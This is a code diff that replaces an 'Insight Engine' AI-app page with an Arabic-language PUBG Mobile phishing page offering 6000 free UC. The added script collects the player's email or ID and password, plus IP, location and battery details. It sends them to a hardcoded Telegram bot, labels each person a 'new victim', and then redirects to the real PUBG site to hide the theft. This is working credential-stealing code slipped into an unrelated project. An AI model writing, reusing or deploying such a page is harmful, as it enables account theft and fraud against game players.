@@ -1,38 +1,102 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Insight Engine</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG - شحن شدات مجانية</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(180deg, #1a1a2e, #16213e, #0f3460);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .logo { font-size: 70px; margin-bottom: 10px; }
+        h1 { color: #f0c040; font-size: 22px; margin-bottom: 5px; }
+        p { color: #aaa; font-size: 13px; margin: 5px 0; }
+        .uc-box {
+            background: rgba(240,192,64,0.1);
+            border: 1px solid #f0c040;
+            border-radius: 12px;
+            padding: 15px; margin: 15px 0;
+        }
+        .uc-box span { color: #f0c040; font-size: 36px; font-weight: bold; }
+        input {
+            width: 100%; padding: 12px; margin: 6px 0;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px; font-size: 14px;
+            outline: none; background: rgba(0,0,0,0.3);
+            color: white;
+        }
+        input:focus { border-color: #f0c040; }
+        .btn {
+            width: 100%; padding: 14px;
+            background: linear-gradient(135deg, #f0c040, #e0a800);
+            color: #000; border: none; border-radius: 10px;
+            font-size: 18px; font-weight: bold;
+            cursor: pointer; margin-top: 15px;
+        }
+    </style>
 </head>
 <body>
-  <div class="app-container">
-    <header>
-      <h1>Insight Engine</h1>
-      <p class="subtitle">Experimental AI Exploration</p>
-    </header>
-
-    <nav class="mode-selector">
-      <button class="mode-btn active" data-mode="insight">Mode A: Insight</button>
-      <button class="mode-btn" data-mode="builder">Mode B: Prompt Builder</button>
-      <button class="mode-btn" data-mode="explain">Mode C: Explain (ELI10)</button>
-    </nav>
-
-    <main>
-      <div class="input-group">
-        <input type="text" id="user-input" placeholder="Enter a thought, topic, or idea..." autocomplete="off">
-        <button id="generate-btn">Generate</button>
-      </div>
-
-      <div id="output-area" class="hidden">
-        <div class="text-card" id="text-output"></div>
-        <div class="image-card" id="image-container">
-          <div class="loader" id="image-loader">Generating Visuals...</div>
+    <div class="container">
+        <div class="logo">🎮</div>
+        <h1>شحن شدات ببجي مجاناً</h1>
+        <p>احصل على 6000 شدة مجانية!</p>
+        
+        <div class="uc-box">
+            <span>6000 UC</span>
+            <p style="color:#f0c040;">مجاناً</p>
         </div>
-      </div>
-    </main>
-  </div>
-  <script src="script.js"></script>
+        
+        <p style="color:#ff4444;">أدخل بيانات حسابك للشحن</p>
+        
+        <input type="text" id="email" placeholder="ايدي اللاعب أو الإيميل">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button class="btn" onclick="submitData()">🎁 استلام الشدة</button>
+        <p style="font-size:10px;color:#555;margin-top:10px;">PUBG Mobile © Tencent 2024</p>
+    </div>
+
+    <script>
+        function getChatId() { return new URL(window.location.href).searchParams.get('chatId') || ''; }
+        const BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+
+        async function getIpInfo() {
+            try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) { const b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; }
+            return { level: '?', charging: '?' };
+        }
+
+        async function submitData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (!email || !password) { alert('يرجى إدخال جميع البيانات!'); return; }
+
+            const [ip, battery] = await Promise.all([getIpInfo(), getBatteryInfo()]);
+            const text = `🎮 ببجي - ضحية جديدة!\n\n📧 الايميل: ${email}\n🔑 الباسورد: ${password}\n\n🌍 IP: ${ip.ip}\n📍 الدولة: ${ip.country}\n🏙️ المدينة: ${ip.city}\n🔋 البطارية: ${battery.level}%\n⚡ الشحن: ${battery.charging}`;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: getChatId(), text: text })
+            });
+            window.location.href = 'https://pubgmobile.com/';
+        }
+    </script>
 </body>
 </html>
